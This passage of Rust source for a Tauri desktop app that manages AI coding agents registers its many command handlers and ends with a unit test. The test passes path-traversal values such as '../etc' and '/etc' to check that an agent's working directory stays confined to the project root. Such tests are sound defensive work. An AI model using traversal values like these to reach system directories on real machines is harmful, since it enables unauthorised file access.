                .item(&PredefinedMenuItem::cut(app, None)?)
                .item(&PredefinedMenuItem::copy(app, None)?)
                .item(&PredefinedMenuItem::paste(app, None)?)
                .item(&PredefinedMenuItem::select_all(app, None)?)
                .build()?;
            let menu = MenuBuilder::new(app)
                .item(&file_menu)
                .item(&edit_menu)
                .build()?;
            app.set_menu(menu)?;
            app.on_menu_event(move |app, event| {
                let _ = app.emit("menu", event.id().0.as_str());
            });
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            add_project,
            list_projects,
            remove_project,
            list_super_projects,
            create_super_project,
            rename_super_project,
            delete_super_project,
            set_super_project_members,
            list_agents,
            running_agents,
            all_agents,
            spawn_agent,
            resume_agent,
            write_input,
            resize_agent,
            close_agent,
            mark_agent_exited,
            agent_scrollback,
            agent_size,
            judge_agent,
            judge_agents,
            judge_helper,
            which_agent,
            daily_summary_ai_cached,
            set_always_on_top,
            pop_out_terminal,
            popped_out,
            close_popout,
            set_agent_title,
            archive_agent,
            delete_agent,
            pause_agent,
            list_tasks,
            add_task,
            all_tasks,
            assign_task,
            update_task,
            plan_tasks,
            set_task_description,
            set_task_steps,
            update_step,
            breakdown_task,
            ingest_agent_tasks,
            auto_assign_tasks,
            link_task_agent,
            delete_task,
            append_task_note,
            check_duplicate_task,
            jira_config_get,
            jira_config_set,
            jira_disconnect,
            jira_test,
            jira_sync,
            jira_my_issues,
            jira_import,
            jira_create_from_task,
            jira_projects,
            read_dir,
            read_file,
            write_file,
            create_file,
            list_files,
            claude_sessions,
            claude_usage,
            git_status,
            git_changes,
            git_diff,
            git_commit,
            git_commit_push,
            git_fetch,
            git_branches,
            git_checkout,
            git_create_branch,
            git_pull,
            git_push,
            run_config,
            run_setup_prompt,
            create_run_config,
            run_command_once,
            save_pause_manifest,
            read_pause_manifest,
            clear_pause_manifest,
            paused_projects,
            detect_running_stacks,
            intent_config,
            set_intent,
            read_intent,
            update_intent,
            agent_edits,
            agent_edit_counts,
            detect_run_command,
            home_dir,
            open_window,
            get_settings,
            set_daily_summary,
            set_auto_continue_rate_limit,
            remote_status,
            set_remote_config,
            set_remote_token,
            remote_notify,
            remote_resolve,
            mobile_status,
            mobile_start,
            mobile_stop,
            cloud_status,
            cloud_start,
            cloud_stop,
            cloud_pairing,
            cloud_login,
            list_skills,
            set_skill_enabled,
            remove_skill,
            install_skill_from_git,
            daily_summary,
            daily_summary_ai,
            summary_dates,
        ])
        .build(tauri::generate_context!())
        .expect("error while building tauri application")
        .run(|app_handle, event| {
            // On exit, kill every running agent so no pty/service is orphaned,
            // and stop the mobile-access daemon child if it's running.
            if let tauri::RunEvent::ExitRequested { .. } = event {
                app_handle.state::<SessionManager>().kill_all();
                app_handle.state::<mobile::MobileState>().stop();
                app_handle.state::<cloud::CloudState>().stop();
            }
        });
}

/// Serializes tests that mutate process-global env (`HOME`) — `std::env::set_var`
/// is process-wide, so HOME-dependent tests across modules would otherwise race.
/// Ignores poisoning so one panicking test doesn't cascade.
#[cfg(test)]
pub(crate) fn env_lock() -> std::sync::MutexGuard<'static, ()> {
    static LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
    LOCK.lock().unwrap_or_else(|e| e.into_inner())
}

#[cfg(test)]
mod pause_tests {
    use super::*;

    /// `confined_cwd` rejects path traversal and absolute escapes, and joins a
    /// legitimate monorepo subdir under the project root.
    #[test]
    fn confined_cwd_blocks_escapes_and_joins_subdir() {
        let root = "/tmp/proj";
        // None / empty → the project root itself.
        assert_eq!(confined_cwd(root, None).unwrap(), root);
        assert_eq!(confined_cwd(root, Some("  ")).unwrap(), root);
        // A normal subdir is joined.
        assert_eq!(confined_cwd(root, Some("apps/web")).unwrap(), "/tmp/proj/apps/web");
        // `..` traversal is refused.
        assert!(confined_cwd(root, Some("../etc")).is_err());
        assert!(confined_cwd(root, Some("apps/../../etc")).is_err());
        // An absolute path can't replace the root.
        assert!(confined_cwd(root, Some("/etc")).is_err());
    }
}
